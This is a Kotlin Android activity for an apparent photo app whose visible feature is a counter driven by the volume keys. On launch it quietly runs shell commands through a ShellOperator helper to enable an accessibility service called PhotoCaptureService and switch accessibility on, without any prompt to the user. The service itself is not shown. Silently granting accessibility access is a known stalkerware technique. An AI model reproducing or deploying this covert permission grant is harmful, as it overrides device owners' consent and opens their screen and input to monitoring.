package com.example.photoapp

import android.content.Context
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    // Counter variables
    private var counter = 0
    private lateinit var counterText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize counter text view
        counterText = findViewById(R.id.counter_text)
        counterText.text = counter.toString()

        // Automatically enable the accessibility service
        enableAccessibilityService(this)
    }

    private fun enableAccessibilityService(context: Context) {
        val serviceName = "${context.packageName}/${PhotoCaptureService::class.java.name}"

        // Command to enable the specific service
        val cmd1 = "settings put secure enabled_accessibility_services $serviceName"
        ShellOperator.runCommand(cmd1)

        // Command to turn on accessibility globally
        val cmd2 = "settings put secure accessibility_enabled 1"
        ShellOperator.runCommand(cmd2)

        Log.d(TAG, "Attempted to enable accessibility service automatically.")
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        Log.d(TAG, "onKeyDown: Key event received with keyCode: $keyCode")
        when (keyCode) {
            KeyEvent.KEYCODE_VOLUME_UP -> {
                counter++
                counterText.text = counter.toString()
                Log.d(TAG, "Volume Up pressed. Counter is now: $counter")
                return true
            }
            KeyEvent.KEYCODE_VOLUME_DOWN -> {
                counter--
                counterText.text = counter.toString()
                Log.d(TAG, "Volume Down pressed. Counter is now: $counter")
                return true
            }
        }
        return super.onKeyDown(keyCode, event)
    }

    companion object {
        private const val TAG = "MainActivity"
    }
}
